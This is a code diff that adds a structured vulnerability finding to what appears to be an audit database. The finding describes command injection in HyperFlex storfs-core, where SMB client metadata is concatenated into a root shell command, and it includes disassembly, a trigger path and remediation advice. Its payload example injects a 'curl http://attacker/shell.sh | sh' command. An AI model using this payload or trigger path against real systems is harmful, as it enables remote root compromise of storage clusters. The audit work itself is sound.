@@ -7404,9 +7404,100 @@ HX_F131 = {
     ),
 }
 
+HX_F132 = {
+    "id": "HX-F132",
+    "title": (
+        "HyperFlex HXDP 5.x/6.x storfs-core: Unsanitized SMB Client Metadata Injected into "
+        "redirect_client.sh Shell Command via sp_system — Command Injection in Storage Redirection Path"
+    ),
+    "severity": "HIGH",
+    "cvss": "8.8",
+    "cwe": "CWE-78",
+    "component": (
+        "storfs-core ELF x86-64 (HXDP 5.5.2b-43453, /opt/springpath/storfs-core/storfs); "
+        "functions vfs_redirect_client @ 0x303590, redirect_client @ 0x307f70; "
+        "script /opt/springpath/storfs-hyperv/redirect_client.sh"
+    ),
+    "evidence": {
+        "call_chain": {
+            "step1_vfs_redirect_client": {
+                "address": "0x303590",
+                "asm": (
+                    "calloc(0x100, 1)                                ; 256-byte heap buf\n"
+                    "snprintf(buf, 0x100, '%s', conn_str)            ; copy client metadata\n"
+                    "ThreadPool_Enqueue(smbRedirectTasksPool,\n"
+                    "                  redirect_client, buf)         ; async dispatch"
+                ),
+                "note": (
+                    "conn_str (rdi) is the SMB connection identifier string — "
+                    "source is the per-connection metadata stored at 0x1320 offset within "
+                    "the tune global struct. No shell-metacharacter sanitization applied."
+                ),
+            },
+            "step2_redirect_client": {
+                "address": "0x307f70",
+                "asm": (
+                    "0x30800b: lea rcx, [0xc51460]  ; '/opt/springpath/storfs-hyperv/redirect_client.sh'\n"
+                    "0x308012: lea rdx, [0xc8b15c]  ; '%s %s'\n"
+                    "0x308019: mov rbx, r8           ; r8 = 256-byte client metadata buf\n"
+                    "0x30801c: mov esi, 0x400         ; snprintf size limit = 1024\n"
+                    "0x308021: mov rdi, rsp           ; dest = stack buf (frame 0x410, canary 0x408)\n"
+                    "0x308026: call snprintf          ; snprintf(rsp, 1024, '%s %s', script, client_data)\n"
+                    "0x30802e: call sp_system         ; fork+execvp('/bin/sh','-c', cmd)"
+                ),
+            },
+            "step3_sp_system": {
+                "address": "0x8c0310",
+                "behavior": (
+                    "fork() + execvp('/bin/sh', ['-c', cmd, NULL]). "
+                    "The libc system() at 0x8c0440 is a stub that panics — sp_system is the "
+                    "intentional shell-exec path. Shell interprets the full concatenated string."
+                ),
+            },
+        },
+        "injection_surface": {
+            "format_string": '"%s %s" % (script_path, client_data)',
+            "effective_command": "/opt/springpath/storfs-hyperv/redirect_client.sh <client_data>",
+            "payload_example": (
+                "If client_data = '127.0.0.1; curl http://attacker/shell.sh | sh', "
+                "executed string becomes:\n"
+                "  /opt/.../redirect_client.sh 127.0.0.1; curl http://attacker/shell.sh | sh\n"
+                "Shell splits on ';' — second command executes as stCtlVM root."
+            ),
+            "metacharacters": "semicolon, pipe, backtick, $(), newline all pass through unsanitized",
+        },
+        "trigger_path": (
+            "SMB2 connection from attacker-controlled client → "
+            "storfs-core processes connection as requiring redirection → "
+            "client_needs_redirection() returns true → "
+            "vfs_redirect_client(conn_str) enqueued → "
+            "redirect_client executes shell command containing conn_str."
+        ),
+        "exploitability_note": (
+            "Exploitability depends on the source of conn_str. "
+            "If derived from kernel-reported client IP (not attacker-writable), "
+            "injection requires a network-adjacent position spoofing the IP string. "
+            "If derived from SMB SESSION_SETUP client name or NETBIOS suffix, "
+            "it is directly attacker-controlled from the SMB2 handshake."
+        ),
+    },
+    "impact": (
+        "Authenticated or unauthenticated SMB2 client on storage network → "
+        "metacharacters in connection identifier → "
+        "arbitrary shell command execution as storfs-core process user (root on stCtlVM) → "
+        "full cluster compromise."
+    ),
+    "remediation": (
+        "Shell-escape or whitelist-validate conn_str before use in snprintf format. "
+        "Replace sp_system(cmd_string) with execvp(script, [script, client_ip, NULL]) "
+        "to pass client data as a discrete argument, not embedded in a shell command string. "
+        "Audit all sp_system call sites for format-string injection."
+    ),
+}
+
 for _f in [
     HX_F120, HX_F121, HX_F122, HX_F123, HX_F124, HX_F125, HX_F126,
-    HX_F127, HX_F128, HX_F129, HX_F130, HX_F131,
+    HX_F127, HX_F128, HX_F129, HX_F130, HX_F131, HX_F132,
 ]:
     FINDINGS[_f["id"]] = _f
 
